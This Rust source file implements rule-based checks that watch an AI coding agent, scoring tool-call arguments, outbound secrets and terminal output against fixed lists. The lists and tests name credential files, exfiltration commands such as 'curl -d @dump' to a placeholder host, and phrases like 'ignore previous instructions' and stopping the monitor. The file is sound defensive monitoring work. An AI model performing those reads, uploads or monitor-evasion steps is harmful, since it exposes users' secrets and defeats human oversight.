// SPDX-License-Identifier: Apache-2.0
//
// THE ONE RULE
//
// Enforcement is deterministic. Models never decide the syscall.
//
// The kernel allows or denies by policy only: fixed rules, no model in the
// decision path, no model call in the file-open / exec / connect hook, ever.
// The syscall never waits on inference.
//
// Models are allowed in two places only:
//   (a) async / alongside — read the event stream after the fact, correlate,
//       score, flag, propose. Off the hot path. That is where this crate lives.
//   (b) precomputed then compiled to a bit — score an artifact once at write
//       time in userspace, store a label; the kernel later reads that label as
//       one bit at kernel speed. The model ran offline; the kernel never calls it.
//
// A model may make a proposed policy stricter, never looser. If a model is
// unsure, the safe default applies. Uncertainty never opens anything.
//
// ── What this crate is ──────────────────────────────────────────────────────
//
// Checks score what an agent is ABOUT TO DO. They run off the hot path, they
// return a probability over a fixed option set plus a confidence, and they
// never return free text and never return a verdict. Nothing here can allow or
// deny anything: a check result is an observation written into the trace,
// joined to the kernel's real decision by session id.
//
// The two checks in this release are deterministic rule-based scorers, not
// models. Their probabilities come from fixed weights, so they are repeatable
// and auditable, but they are NOT calibrated against labelled data — do not
// read them as calibrated posteriors. Checks 1, 2, 4 and 6 are planned; see
// checks/README.md.

pub mod jev;
pub mod thresholds;

use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};

/// Which check produced a result. The wire name is the stable identifier that
/// appears in the trace.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Check {
    /// Check 3 — is this call about to touch something it should not?
    ToolCallArgumentRisk,
    /// Check 5 — is a secret about to leave through this call?
    SensitiveDataExposure,
    /// Check 7 — what is the agent SAYING it is doing?
    ///
    /// Scores text the agent printed to its terminal, captured below the
    /// agent by the kernel rather than reported by a hook. A separate check
    /// rather than a reuse of check 3: that one is about structured tool-call
    /// arguments, and its options describe argument shapes. This one is about
    /// prose, and prose cannot be squeezed into "writes_outside_workspace"
    /// without the option meaning two different things.
    ///
    /// It describes what the output STATES, not what happened. The kernel
    /// records what happened. An agent announcing an exfiltration it never
    /// performed is still worth a human's eye, and an agent that performs one
    /// silently is caught by the kernel, not here.
    AgentOutputRisk,
}

impl Check {
    pub fn wire_name(self) -> &'static str {
        match self {
            Check::ToolCallArgumentRisk => "tool_call_argument_risk",
            Check::SensitiveDataExposure => "sensitive_data_exposure",
            Check::AgentOutputRisk => "agent_output_risk",
        }
    }

    /// How serious each option is, low to high. Used to enforce monotonicity:
    /// an optional provider may raise a result to a more severe option, never
    /// lower it. Unknown options rank 0 so they can never be used to downgrade.
    pub fn severity_rank(self, option: &str) -> u8 {
        match (self, option) {
            (Check::ToolCallArgumentRisk, "benign") => 0,
            (Check::ToolCallArgumentRisk, "unapproved_network_host") => 1,
            (Check::ToolCallArgumentRisk, "writes_outside_workspace") => 2,
            (Check::ToolCallArgumentRisk, "reads_sensitive_path") => 3,
            (Check::SensitiveDataExposure, "none") => 0,
            (Check::SensitiveDataExposure, "possible_secret") => 1,
            (Check::SensitiveDataExposure, "secret_pattern_matched") => 2,
            (Check::AgentOutputRisk, "benign") => 0,
            (Check::AgentOutputRisk, "states_policy_evasion") => 1,
            (Check::AgentOutputRisk, "states_credential_access") => 2,
            (Check::AgentOutputRisk, "states_exfiltration") => 3,
            _ => 0,
        }
    }

    /// The FIXED option set. A check may only ever return one of these; adding
    /// an option is a versioned change to the trace format.
    pub fn options(self) -> &'static [&'static str] {
        match self {
            Check::ToolCallArgumentRisk => &[
                "benign",
                "reads_sensitive_path",
                "writes_outside_workspace",
                "unapproved_network_host",
            ],
            Check::SensitiveDataExposure => &["none", "possible_secret", "secret_pattern_matched"],
            Check::AgentOutputRisk => &[
                "benign",
                "states_credential_access",
                "states_exfiltration",
                "states_policy_evasion",
            ],
        }
    }
}

/// One check result. `probability` is the weight this scorer assigns to the
/// chosen option; `confidence` is how strongly the evidence determined it.
/// Both are in [0.0, 1.0]. `evidence` holds short, non-secret fragments a
/// human can read in the review queue — never the matched secret itself.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckResult {
    pub check: String,
    pub option: String,
    pub probability: f32,
    /// `None` when the question type carries no separate confidence (a `noul`
    /// answers with the probability alone). That is not the same as 0.0, which
    /// would mean the scorer was certain of nothing.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub confidence: Option<f32>,
    pub evidence: Vec<String>,
    /// Which provider produced this result: "deterministic" or "jev".
    #[serde(default = "default_provider")]
    pub provider: String,
    /// Set when an optional provider was configured but could not be used, so
    /// the trace shows the deterministic result was a fallback and why.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub provider_error: Option<String>,
}

fn default_provider() -> String {
    "deterministic".to_string()
}

impl CheckResult {
    fn new(check: Check, option: &str, probability: f32, confidence: Option<f32>) -> Self {
        debug_assert!(
            check.options().contains(&option),
            "option not in the fixed set for this check"
        );
        Self {
            check: check.wire_name().to_string(),
            option: option.to_string(),
            probability,
            confidence,
            evidence: Vec::new(),
            provider: default_provider(),
            provider_error: None,
        }
    }

    /// The check this result belongs to, recovered from the wire name.
    pub fn check_kind(&self) -> Option<Check> {
        match self.check.as_str() {
            "tool_call_argument_risk" => Some(Check::ToolCallArgumentRisk),
            "sensitive_data_exposure" => Some(Check::SensitiveDataExposure),
            "agent_output_risk" => Some(Check::AgentOutputRisk),
            _ => None,
        }
    }

    fn with(mut self, evidence: impl Into<String>) -> Self {
        self.evidence.push(evidence.into());
        self
    }

    /// True when this result is worth a human's attention in the review queue.
    pub fn is_flag(&self) -> bool {
        !matches!(self.option.as_str(), "benign" | "none")
    }
}

// ── Check 3: tool-call argument risk ────────────────────────────────────────

/// Paths that hold credentials on a normal developer machine. Matched against
/// the whole argument blob, so `~/.aws/credentials` and an absolute form both
/// hit. This list is deliberately small and boring: every entry is a place a
/// credential actually lives, not a guess about intent.
static SENSITIVE_PATHS: &[&str] = &[
    ".aws/credentials",
    ".aws/config",
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".ssh/id_ecdsa",
    ".ssh/authorized_keys",
    ".kube/config",
    ".docker/config.json",
    ".npmrc",
    ".pypirc",
    ".netrc",
    ".gnupg/",
    "/etc/shadow",
    "/etc/ld.so.preload",
    ".env",
];

static URL_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"https?://([A-Za-z0-9._-]+)(?::\d+)?").expect("static regex"));

/// Score a tool call's arguments.
///
/// `tool` is the harness's tool name (Bash, Write, WebFetch …), `args` is the
/// raw argument JSON the harness was given, `workspace` is the directory the
/// agent is supposed to be working in, and `approved_hosts` is the allow-list
/// of hosts the operator has approved. Everything is optional because hooks
/// vary in what they report; a missing field lowers confidence rather than
/// inventing a finding.
pub fn tool_call_argument_risk(
    tool: &str,
    args: &serde_json::Value,
    workspace: Option<&str>,
    approved_hosts: &[String],
) -> CheckResult {
    let t = thresholds::current();
    let blob = args.to_string();

    // A sensitive path in the arguments is the strongest signal available here
    // and it is a literal string match, so confidence is high.
    for needle in SENSITIVE_PATHS {
        if blob.contains(needle) {
            return CheckResult::new(
                Check::ToolCallArgumentRisk,
                "reads_sensitive_path",
                t.strong_match.probability,
                Some(t.strong_match.confidence),
            )
            .with(format!("argument references {needle}"))
            .with(format!("tool={tool}"));
        }
    }

    // A write whose target escapes the workspace. Only meaningful when the
    // harness told us both the path and the workspace.
    let write_target = args
        .get("file_path")
        .or_else(|| args.get("path"))
        .or_else(|| args.get("notebook_path"))
        .and_then(|v| v.as_str());
    if let (Some(target), Some(ws)) = (write_target, workspace) {
        if target.starts_with('/') && !target.starts_with(ws) {
            return CheckResult::new(
                Check::ToolCallArgumentRisk,
                "writes_outside_workspace",
                t.partial_match.probability,
                Some(t.partial_match.confidence),
            )
            .with(format!("target {target} is outside {ws}"));
        }
    }

    // An outbound host that is not on the operator's list. Scored low on its
    // own: fetching a URL is ordinary work, and this check cannot see whether
    // anything sensitive is in flight. It is the join with the kernel's
    // recorded connect event that makes it interesting.
    if let Some(m) = URL_RE.captures(&blob) {
        let host = m.get(1).map(|h| h.as_str()).unwrap_or_default();
        let known = approved_hosts.iter().any(|h| h == host);
        let loopback = host == "localhost" || host.starts_with("127.") || host == "::1";
        if !known && !loopback && !host.is_empty() {
            // No approved list configured means the check cannot really judge,
            // so it says so with the weak band's confidence rather than the
            // one it uses when a list exists to compare against.
            let confidence = Some(if approved_hosts.is_empty() {
                t.weak_match.confidence
            } else {
                t.partial_match.confidence
            });
            return CheckResult::new(
                Check::ToolCallArgumentRisk,
                "unapproved_network_host",
                t.weak_match.probability,
                confidence,
            )
            .with(format!("host {host} is not on the approved list"));
        }
    }

    CheckResult::new(
        Check::ToolCallArgumentRisk,
        "benign",
        t.benign.probability,
        Some(t.benign.confidence),
    )
}

// ── Check 5: sensitive-data exposure ────────────────────────────────────────

/// Secret shapes with a low false-positive rate. Each is a structural match —
/// a prefix and a length — not a guess from surrounding words.
static SECRET_PATTERNS: Lazy<Vec<(&'static str, Regex)>> = Lazy::new(|| {
    vec![
        (
            "aws_access_key_id",
            Regex::new(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b").unwrap(),
        ),
        (
            "private_key_block",
            Regex::new(r"-----BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----").unwrap(),
        ),
        (
            "github_token",
            Regex::new(r"\bgh[pousr]_[A-Za-z0-9]{36,}\b").unwrap(),
        ),
        (
            "slack_token",
            Regex::new(r"\bxox[abprs]-[0-9A-Za-z-]{10,}\b").unwrap(),
        ),
        (
            "google_api_key",
            Regex::new(r"\bAIza[0-9A-Za-z_-]{35}\b").unwrap(),
        ),
        (
            "jwt",
            Regex::new(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b")
                .unwrap(),
        ),
    ]
});

/// Words that suggest a credential without proving one. These only ever
/// produce `possible_secret`, never `secret_pattern_matched`.
static WEAK_HINTS: &[&str] = &[
    "password=",
    "passwd=",
    "secret_key",
    "client_secret",
    "api_key=",
    "authorization: bearer ",
];

/// Score whether a secret is about to leave through this text.
///
/// `text` is the outbound content — a tool-call argument, a request body. The
/// result records WHICH pattern matched, never the matched value.
pub fn sensitive_data_exposure(text: &str) -> CheckResult {
    let t = thresholds::current();
    for (label, re) in SECRET_PATTERNS.iter() {
        if re.is_match(text) {
            return CheckResult::new(
                Check::SensitiveDataExposure,
                "secret_pattern_matched",
                t.secret_pattern.probability,
                Some(t.secret_pattern.confidence),
            )
            .with(format!("matched {label}"));
        }
    }

    let lowered = text.to_ascii_lowercase();
    for hint in WEAK_HINTS {
        if lowered.contains(hint) {
            return CheckResult::new(
                Check::SensitiveDataExposure,
                "possible_secret",
                t.weak_match.probability,
                Some(t.weak_match.confidence),
            )
            .with(format!("contains {hint:?}"));
        }
    }

    CheckResult::new(
        Check::SensitiveDataExposure,
        "none",
        t.benign.probability,
        Some(t.benign.confidence),
    )
}

// ── Check 7: agent output risk ──────────────────────────────────────────────

/// Phrases an agent uses when it is about to touch, or has touched, a
/// credential. Matched case-insensitively against captured terminal output.
///
/// Deliberately boring and small. These are things a coding agent actually
/// prints, not an attempt to guess intent from vocabulary. Every one of them
/// is a lead for a human to read the trace, never a verdict.
static OUTPUT_CREDENTIAL_PHRASES: &[&str] = &[
    "aws_secret_access_key",
    "aws_access_key_id",
    ".aws/credentials",
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    "private key",
    "api key",
    "bearer token",
    "reading credentials",
    "/etc/shadow",
    ".netrc",
    ".npmrc",
];

/// Phrases about moving data off the machine.
static OUTPUT_EXFIL_PHRASES: &[&str] = &[
    "curl -d",
    "curl --data",
    "uploading to",
    "posting to http",
    "sending to http",
    "base64 | curl",
    "exfiltrat",
    "webhook.site",
    "pastebin.com",
    "transfer.sh",
];

/// Phrases about getting around the thing that is watching.
static OUTPUT_EVASION_PHRASES: &[&str] = &[
    "ignore previous instructions",
    "ignore all previous",
    "disable the security",
    "disable enforcement",
    "bypass the policy",
    "without triggering",
    "avoid detection",
    "turn off ringzero",
    "systemctl stop ringzero",
];

/// Score text an agent printed to its terminal.
///
/// Deterministic and offline: a substring match over fixed phrase lists. It is
/// the floor and the fallback for the optional model provider, exactly like the
/// other checks, and it is never in a syscall path — this runs on a flush
/// boundary well after the write happened.
///
/// The text passed here must already have been through the operator's redactor.
/// This function does not redact, and it puts no captured text in `evidence`:
/// only the phrase that matched, which comes from the lists above and is
/// therefore never a secret.
pub fn agent_output_risk(text: &str) -> CheckResult {
    let t = thresholds::current();
    let hay = text.to_lowercase();

    // Order matters: the most severe reading of the same text wins, so a line
    // that talks about both a credential and sending it off the box is scored
    // as exfiltration.
    if let Some(p) = OUTPUT_EXFIL_PHRASES.iter().find(|p| hay.contains(**p)) {
        return CheckResult::new(
            Check::AgentOutputRisk,
            "states_exfiltration",
            t.strong_match.probability,
            Some(t.strong_match.confidence),
        )
        .with(format!("output mentions {p:?}"));
    }
    if let Some(p) = OUTPUT_CREDENTIAL_PHRASES.iter().find(|p| hay.contains(**p)) {
        return CheckResult::new(
            Check::AgentOutputRisk,
            "states_credential_access",
            t.partial_match.probability,
            Some(t.partial_match.confidence),
        )
        .with(format!("output mentions {p:?}"));
    }
    if let Some(p) = OUTPUT_EVASION_PHRASES.iter().find(|p| hay.contains(**p)) {
        return CheckResult::new(
            Check::AgentOutputRisk,
            "states_policy_evasion",
            t.weak_match.probability,
            Some(t.weak_match.confidence),
        )
        .with(format!("output mentions {p:?}"));
    }

    CheckResult::new(
        Check::AgentOutputRisk,
        "benign",
        t.benign.probability,
        Some(t.benign.confidence),
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Check 7: agent output risk ──────────────────────────────────────────

    #[test]
    fn ordinary_agent_chatter_is_benign() {
        for text in [
            "Running the test suite now.",
            "I updated src/main.rs and the tests pass.",
            "Reading the README to understand the build.",
        ] {
            let r = agent_output_risk(text);
            assert_eq!(r.option, "benign", "{text:?} should be benign");
            assert!(!r.is_flag());
        }
    }

    #[test]
    fn output_that_talks_about_credentials_is_flagged() {
        let r = agent_output_risk("Let me check ~/.aws/credentials for the key");
        assert_eq!(r.option, "states_credential_access");
        assert!(r.is_flag());
        assert_eq!(r.provider, "deterministic");
    }

    #[test]
    fn output_that_talks_about_sending_data_away_outranks_credentials() {
        // Both signals present: the more severe reading wins.
        let r = agent_output_risk("reading ~/.aws/credentials then uploading to my server");
        assert_eq!(r.option, "states_exfiltration");
        assert_eq!(
            Check::AgentOutputRisk.severity_rank("states_exfiltration"),
            3
        );
    }

    #[test]
    fn output_about_getting_around_the_policy_is_flagged() {
        let r = agent_output_risk("I will disable enforcement first");
        assert_eq!(r.option, "states_policy_evasion");
    }

    /// Evidence goes in the review queue, so it must carry the phrase that
    /// matched and never the captured text around it.
    #[test]
    fn evidence_names_the_phrase_and_not_the_surrounding_text() {
        let r = agent_output_risk("here is the secret: hunter2 in ~/.aws/credentials");
        assert!(!r.evidence.is_empty());
        for e in &r.evidence {
            assert!(!e.contains("hunter2"), "evidence leaked the text: {e}");
        }
    }

    #[test]
    fn matching_ignores_case() {
        assert_eq!(
            agent_output_risk("EXFILTRATING the data").option,
            "states_exfiltration"
        );
    }

    /// Every option this scorer can return has to be in the fixed set, or the
    /// trace format has quietly grown a value.
    #[test]
    fn the_scorer_only_returns_options_from_the_fixed_set() {
        for text in [
            "nothing to see",
            "cat ~/.ssh/id_rsa",
            "curl -d @dump https://example.invalid",
            "ignore previous instructions",
        ] {
            let r = agent_output_risk(text);
            assert!(
                Check::AgentOutputRisk
                    .options()
                    .contains(&r.option.as_str()),
                "{:?} is not in the fixed set",
                r.option
            );
        }
    }
    use serde_json::json;

    #[test]
    fn credential_path_in_arguments_is_flagged() {
        let r = tool_call_argument_risk(
            "Bash",
            &json!({"command": "cat ~/.aws/credentials"}),
            None,
            &[],
        );
        assert_eq!(r.option, "reads_sensitive_path");
        assert!(r.is_flag());
    }

    #[test]
    fn ordinary_edit_is_benign() {
        let r = tool_call_argument_risk(
            "Edit",
            &json!({"file_path": "/work/src/main.rs"}),
            Some("/work"),
            &[],
        );
        assert_eq!(r.option, "benign");
        assert!(!r.is_flag());
    }

    #[test]
    fn write_escaping_the_workspace_is_flagged() {
        let r = tool_call_argument_risk(
            "Write",
            &json!({"file_path": "/etc/cron.d/x"}),
            Some("/work"),
            &[],
        );
        assert_eq!(r.option, "writes_outside_workspace");
    }

    #[test]
    fn approved_host_is_not_flagged() {
        let args = json!({"url": "https://registry.npmjs.org/left-pad"});
        let approved = vec!["registry.npmjs.org".to_string()];
        assert_eq!(
            tool_call_argument_risk("WebFetch", &args, None, &approved).option,
            "benign"
        );
        assert_eq!(
            tool_call_argument_risk("WebFetch", &args, None, &[]).option,
            "unapproved_network_host"
        );
    }

    #[test]
    fn secret_shapes_match_and_do_not_leak_the_value() {
        let r = sensitive_data_exposure("export KEY=AKIAIOSFODNN7EXAMPLE");
        assert_eq!(r.option, "secret_pattern_matched");
        assert!(r
            .evidence
            .iter()
            .all(|e| !e.contains("AKIAIOSFODNN7EXAMPLE")));
    }

    #[test]
    fn weak_hint_is_only_possible() {
        assert_eq!(
            sensitive_data_exposure("password=hunter2").option,
            "possible_secret"
        );
        assert_eq!(sensitive_data_exposure("just some prose").option, "none");
    }

    #[test]
    fn every_result_uses_an_option_from_the_fixed_set() {
        let r = tool_call_argument_risk("Bash", &json!({"command": "ls"}), None, &[]);
        assert!(Check::ToolCallArgumentRisk
            .options()
            .contains(&r.option.as_str()));
        let r = sensitive_data_exposure("nothing here");
        assert!(Check::SensitiveDataExposure
            .options()
            .contains(&r.option.as_str()));
    }
}
